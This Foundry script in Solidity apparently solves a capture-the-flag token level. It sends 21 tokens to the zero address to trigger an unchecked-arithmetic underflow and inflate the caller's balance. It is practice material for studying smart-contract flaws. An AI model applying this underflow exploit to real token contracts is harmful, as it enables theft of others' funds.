// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Lev5Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 增加手中代幣的數量

contract Lev5Sol is Script {
    Lev5Token public lev5Instance =
        Lev5Token(payable(0x412c9BF89789F0C8e88e7557Ec5b7bBEbFbfa3ef));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        lev5Instance.transfer(address(0), 21);
        vm.stopBroadcast();
    }
}
